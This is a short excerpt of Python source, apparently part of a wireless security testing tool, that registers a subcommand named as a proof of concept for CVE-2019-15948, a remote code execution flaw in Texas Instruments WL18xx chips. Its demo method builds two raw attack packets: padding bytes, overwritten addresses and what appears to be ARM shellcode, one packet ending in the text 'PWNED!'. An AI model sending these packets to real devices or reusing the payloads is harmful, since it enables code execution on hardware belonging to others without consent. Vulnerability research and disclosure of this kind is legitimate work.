...
class TestSet():
    def __init__(self, subparsers):
        ...
        self.parser = subparsers.add_parser(self.cmd, help='[CVE-2019-15948] Texas Instruments WL18xx RCE PoC')
    ...
    def demo(self):
        ...
        pkt01  = b"\x41\x41\x41\x41\x41\xf1\x39\x08\x20\x41\x41\x41\x41\x41\x2c\x3a"
        pkt01 += b"\x08\x20\x08\x00\x00\x00\x34\x3a\x08\x20\x07\x09\x50\x57\x4e\x45"
        pkt01 += b"\x44\x21"

        # refer pwned.s
        pkt02  = b"\x41\x41\x41\x41\x41\xf1\x39\x08\x20\x41\x4d\xf2\xd5\x15\xc0\xf2"
        pkt02 += b"\x08\x05\x0b\x49\x0a\x20\xa8\x47\x01\x21\x04\x20\xa8\x47\xbf\xf3"
        pkt02 += b"\x6f\x8f\xfc\xe7"
